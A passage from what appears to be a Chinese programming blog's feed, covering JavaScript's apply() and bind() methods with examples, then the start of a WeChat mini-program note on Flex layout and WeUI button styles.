&#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure><p>空元素与<code>undefined</code>的差别在于，数组的<code>forEach</code>方法会跳过空元素，但是不会跳过<code>undefined</code>。因此，遍历内部元素的时候，会得到不同的结果。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, , <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">forEach</span>(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, a).<span class="title function_">forEach</span>(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// b</span></span><br></pre></td></tr></table></figure><p><strong>（3）转换类似数组的对象</strong></p><p>另外，利用数组对象的<code>slice</code>方法，可以将一个类似数组的对象（比如<code>arguments</code>对象）转为真正的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [1]</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>&#125;) <span class="comment">// []</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;) <span class="comment">// [1, undefined]</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure><p>上面代码的<code>apply</code>方法的参数都是对象，但是返回结果都是数组，这就起到了将对象转成数组的目的。从上面代码可以看到，这个方法起作用的前提是，被处理的对象必须有<code>length</code>属性，以及相对应的数字键。</p><p><strong>（4）绑定回调函数的对象</strong></p><p>前面的按钮点击事件的例子，可以改写如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">o.<span class="property">f</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  o.<span class="property">f</span>.<span class="title function_">apply</span>(o);</span><br><span class="line">  <span class="comment">// 或者 o.f.call(o);</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, f);</span><br></pre></td></tr></table></figure><p>上面代码中，点击按钮以后，控制台将会显示<code>true</code>。由于<code>apply()</code>方法（或者<code>call()</code>方法）不仅绑定函数执行时所在的对象，还会立即执行函数，因此不得不把绑定语句写在一个函数体内。更简洁的写法是采用下面介绍的<code>bind()</code>方法。</p><h4 id="0x010403-Function-prototype-bind"><a href="#0x010403-Function-prototype-bind" class="headerlink" title="0x010403 Function.prototype.bind()"></a>0x010403 Function.prototype.bind()</h4><p><code>bind()</code>方法用于将函数体内的<code>this</code>绑定到某个对象，然后返回一个新函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">d.<span class="title function_">getTime</span>() <span class="comment">// 1481869925657</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> print = d.<span class="property">getTime</span>;</span><br><span class="line"><span class="title function_">print</span>() <span class="comment">// Uncaught TypeError: this is not a Date object.</span></span><br></pre></td></tr></table></figure><p>上面代码中，我们将<code>d.getTime()</code>方法赋给变量<code>print</code>，然后调用<code>print()</code>就报错了。这是因为<code>getTime()</code>方法内部的<code>this</code>，绑定<code>Date</code>对象的实例，赋给变量<code>print</code>以后，内部的<code>this</code>已经不指向<code>Date</code>对象的实例了。</p><p><code>bind()</code>方法可以解决这个问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> print = d.<span class="property">getTime</span>.<span class="title function_">bind</span>(d);</span><br><span class="line"><span class="title function_">print</span>() <span class="comment">// 1481869925657</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>bind()</code>方法将<code>getTime()</code>方法内部的<code>this</code>绑定到<code>d</code>对象，这时就可以安全地将这个方法赋值给其他变量了。</p><p><code>bind</code>方法的参数就是所要绑定<code>this</code>的对象，下面是一个更清晰的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = counter.<span class="property">inc</span>.<span class="title function_">bind</span>(counter);</span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line">counter.<span class="property">count</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>counter.inc()</code>方法被赋值给变量<code>func</code>。这时必须用<code>bind()</code>方法将<code>inc()</code>内部的<code>this</code>，绑定到<code>counter</code>，否则就会出错。</p><p><code>this</code>绑定到其他对象也是可以的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> func = counter.<span class="property">inc</span>.<span class="title function_">bind</span>(obj);</span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line">obj.<span class="property">count</span> <span class="comment">// 101</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>bind()</code>方法将<code>inc()</code>方法内部的<code>this</code>，绑定到<code>obj</code>对象。结果调用<code>func</code>函数以后，递增的就是<code>obj</code>内部的<code>count</code>属性。</p><p><code>bind()</code>还可以接受更多的参数，将这些参数绑定原函数的参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x * <span class="variable language_">this</span>.<span class="property">m</span> + y * <span class="variable language_">this</span>.<span class="property">n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">m</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">n</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newAdd = add.<span class="title function_">bind</span>(obj, <span class="number">5</span>);</span><br><span class="line"><span class="title function_">newAdd</span>(<span class="number">5</span>) <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>bind()</code>方法除了绑定<code>this</code>对象，还将<code>add()</code>函数的第一个参数<code>x</code>绑定成<code>5</code>，然后返回一个新函数<code>newAdd()</code>，这个函数只要再接受一个参数<code>y</code>就能运行了。</p><p>如果<code>bind()</code>方法的第一个参数是<code>null</code>或<code>undefined</code>，等于将<code>this</code>绑定到全局对象，函数运行时<code>this</code>指向顶层对象（浏览器为<code>window</code>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> plus5 = add.<span class="title function_">bind</span>(<span class="literal">null</span>, <span class="number">5</span>);</span><br><span class="line"><span class="title function_">plus5</span>(<span class="number">10</span>) <span class="comment">// 15</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>add()</code>内部并没有<code>this</code>，使用<code>bind()</code>方法的主要目的是绑定参数<code>x</code>，以后每次运行新函数<code>plus5()</code>，就只需要提供另一个参数<code>y</code>就够了。而且因为<code>add()</code>内部没有<code>this</code>，所以<code>bind()</code>的第一个参数是<code>null</code>，不过这里如果是其他对象，也没有影响。</p><p><code>bind()</code>方法有一些使用注意点。</p><p><strong>（1）每一次返回一个新函数</strong></p><p><code>bind()</code>方法每运行一次，就返回一个新函数，这会产生一些问题。比如，监听事件的时候，不能写成下面这样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">m</span>.<span class="title function_">bind</span>(o));</span><br></pre></td></tr></table></figure><p>上面代码中，<code>click</code>事件绑定<code>bind()</code>方法生成的一个匿名函数。这样会导致无法取消绑定，所以下面的代码是无效的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">m</span>.<span class="title function_">bind</span>(o));</span><br></pre></td></tr></table></figure><p>正确的方法是写成下面这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listener = o.<span class="property">m</span>.<span class="title function_">bind</span>(o);</span><br><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener);</span><br><span class="line"><span class="comment">//  ...</span></span><br><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener);</span><br></pre></td></tr></table></figure><p><strong>（2）结合回调函数使用</strong></p><p>回调函数是 JavaScript 最常用的模式之一，但是一个常见的错误是，将包含<code>this</code>的方法直接当作回调函数。解决方法就是使用<code>bind()</code>方法，将<code>counter.inc()</code>绑定<code>counter</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callIt</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">  <span class="title function_">callback</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">callIt</span>(counter.<span class="property">inc</span>.<span class="title function_">bind</span>(counter));</span><br><span class="line">counter.<span class="property">count</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>callIt()</code>方法会调用回调函数。这时如果直接把<code>counter.inc</code>传入，调用时<code>counter.inc()</code>内部的<code>this</code>就会指向全局对象。使用<code>bind()</code>方法将<code>counter.inc</code>绑定<code>counter</code>以后，就不会有这个问题，<code>this</code>总是指向<code>counter</code>。</p><p>还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的<code>this</code>指向，很可能也会出错。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">times</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  <span class="attr">print</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// 没有任何输出</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>obj.print</code>内部<code>this.times</code>的<code>this</code>是指向<code>obj</code>的，这个没有问题。但是，<code>forEach()</code>方法的回调函数内部的<code>this.name</code>却是指向全局对象，导致没有办法取到值。稍微改动一下，就可以看得更清楚。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="property">print</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === <span class="variable language_">window</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>解决这个问题，也是通过<code>bind()</code>方法绑定<code>this</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="property">print</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br></pre></td></tr></table></figure><p><strong>（3）结合<code>call()</code>方法使用</strong></p><p>利用<code>bind()</code>方法，可以改写一些 JavaScript 原生方法的使用形式，以数组的<code>slice()</code>方法为例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><p>上面的代码中，数组的<code>slice</code>方法从<code>[1, 2, 3]</code>里面，按照指定的开始位置和结束位置，切分出另一个数组。这样做的本质是在<code>[1, 2, 3]</code>上面调用<code>Array.prototype.slice()</code>方法，因此可以用<code>call</code>方法表达这个过程，得到同样的结果。</p><p><code>call()</code>方法实质上是调用<code>Function.prototype.call()</code>方法，因此上面的表达式可以用<code>bind()</code>方法改写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>);</span><br><span class="line"><span class="title function_">slice</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><p>上面代码的含义就是，将<code>Array.prototype.slice</code>变成<code>Function.prototype.call</code>方法所在的对象，调用时就变成了<code>Array.prototype.slice.call</code>。类似的写法还可以用于其他数组方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> push = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>);</span><br><span class="line"><span class="keyword">var</span> pop = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pop</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span> ,<span class="number">2</span> ,<span class="number">3</span>];</span><br><span class="line"><span class="title function_">push</span>(a, <span class="number">4</span>)</span><br><span class="line">a <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">pop</span>(a)</span><br><span class="line">a <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>如果再进一步，将<code>Function.prototype.call</code>方法绑定到<code>Function.prototype.bind</code>对象，就意味着<code>bind</code>的调用形式也可以被改写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123; <span class="attr">v</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> bind = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bind</span>);</span><br><span class="line"><span class="title function_">bind</span>(f, o)() <span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>上面代码的含义就是，将<code>Function.prototype.bind</code>方法绑定在<code>Function.prototype.call</code>上面，所以<code>bind</code>方法就可以直接使用，不需要在函数实例上使用。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 02</title>
      <link href="/2021/08/31/aba664882fa9-q1jun/"/>
      <url>/2021/08/31/aba664882fa9-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-02"><a href="#微信小程序学习笔记-02" class="headerlink" title="微信小程序学习笔记 02"></a>微信小程序学习笔记 02</h1><h2 id="0x01-Flex布局应用"><a href="#0x01-Flex布局应用" class="headerlink" title="0x01 Flex布局应用"></a>0x01 Flex布局应用</h2><p>首先，在<code>pages/home</code>目录里面，新建一个<code>index.wxss</code>文件，这个文件设置的样式，只对 home 页面生效。这是因为每个页面通常有不一样的布局，所以页面布局一般不写在全局的<code>app.wxss</code>里面。</p><p>然后，<code>index.wxss</code>文件写入下面的内容。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">page &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">750</span>rpx;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发者工具导入项目代码，页面渲染结果如下。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114142623423.png" alt="image-20220114142623423" style="zoom:50%;" /><p>下面解释一下上面这段 WXSS 代码，还是很简单的。</p><p>（1）<code>height: 100%;</code>：页面高度为整个屏幕高度。</p><p>（2）<code>width: 750rpx;</code>：页面宽度为整个屏幕宽度。</p><p>注意，这里单位是<code>rpx</code>，而不是<code>px</code>。<code>rpx</code>是小程序为适应不同宽度的手机屏幕，而发明的一种长度单位。不管什么手机屏幕，宽度一律为<code>750rpx</code>。它的好处是换算简单，如果一个元素的宽度是页面的一半，只要写成<code>width: 375rpx;</code>即可。</p><p>（3）<code>display: flex;</code>：整个页面（page）采用 Flex 布局。</p><p>（4）<code>justify-content: center;</code>：页面的一级子元素（这个示例是<code>&lt;view&gt;</code>）水平居中。</p><p>（5）<code>align-items: center;</code>：页面的一级子元素（这个示例是<code>&lt;view&gt;</code>）垂直居中。一个元素同时水平居中和垂直中央，就相当于处在页面的中央了。</p><h2 id="0x02-WeUI的应用"><a href="#0x02-WeUI的应用" class="headerlink" title="0x02 WeUI的应用"></a>0x02 WeUI的应用</h2><p>如果页面的所有样式都自己写，还是挺麻烦的，也没有这个必要。腾讯封装了一套 UI 框架 <a target="_blank" rel="noopener" href="https://github.com/Tencent/weui">WeUI</a>，可以拿来用。</p><p>手机访问 <a target="_blank" rel="noopener" href="https://weui.io/">weui.io</a>，可以看到这套 UI 框架的效果</p><p>首先，进入它的 <a target="_blank" rel="noopener" href="https://github.com/Tencent/weui-wxss/">GitHub 仓库</a>，在<code>dist/style</code>目录下面，找到<a target="_blank" rel="noopener" href="https://github.com/Tencent/weui-wxss/blob/master/dist/style/weui.wxss"><code>weui.wxss</code></a>这个文件，将<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Tencent/weui-wxss/master/dist/style/weui.wxss">源码</a>全部复制到你的<code>app.wxss</code>文件的头部。</p><p>然后，将<code>page/home/index.wxml</code>文件改成下面这样。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">        &lt;<span class="selector-tag">button</span> class=&quot;weui-btn weui-btn_primary&quot;&gt;</span><br><span class="line">            主操作</span><br><span class="line">        &lt;/<span class="selector-tag">button</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">button</span> class=&quot;weui-btn weui-btn_primary weui-btn_loading&quot;&gt;</span><br><span class="line">            &lt;<span class="selector-tag">i</span> class=&quot;weui-loading&quot;&gt;&lt;/<span class="selector-tag">i</span>&gt;正在加载</span><br><span class="line">        &lt;/<span class="selector-tag">button</span>&gt;</span><br><span class="line">        &lt;<span class="selector-tag">button</span> class=&quot;weui-btn weui-btn_primary weui-btn_disabled&quot;&gt;</span><br><span class="line">            禁止点击</span><br><span class="line">        &lt;/<span class="selector-tag">button</span>&gt;</span><br><span class="line">    &lt;view&gt;</span><br><span class="line">    &lt;text class=&quot;title&quot;&gt;当前时间为：&#123;&#123;<span class="selector-tag">time</span>&#125;&#125;&lt;/text&gt;</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>开发者工具导入项目代码，页面渲染结果如下。</p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114145323561.png" alt="image-20220114145323561" style="zoom:50%;" /><p>可以看到，加入 WeUI 框架以后，只要为按钮添加不同的 class，就能自动出现框架提供的样式。你可以根据需要，为页面选择不同的按钮。</p><p>这个示例中，<code>&lt;button&gt;</code>元素使用了下面的<code>class</code>。</p><ul><li><code>weui-btn</code>：按钮样式的基类</li><li><code>weui-btn_primary</code>：主按钮的样式。如果是次要按钮，就使用<code>weui-btn_default</code>。</li><li><code>weui-btn_loading</code>：按钮点击后，操作正在进行中的样式。该类内部需要用<code>&lt;i&gt;</code>元素，加上表示正在加载的图标。</li><li><code>weui-btn_disabled</code>：按钮禁止点击的样式。</li></ul><p>WeUI 提供了大量的元素样式，完整的清单可以查看<a target="_blank" rel="noopener" href="https://github.com/Tencent/weui-wxss">这里</a>。</p><h2 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a>0x03 